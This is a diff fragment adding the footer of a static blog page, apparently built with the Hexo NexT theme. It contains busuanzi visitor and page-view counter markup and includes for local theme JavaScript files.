+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
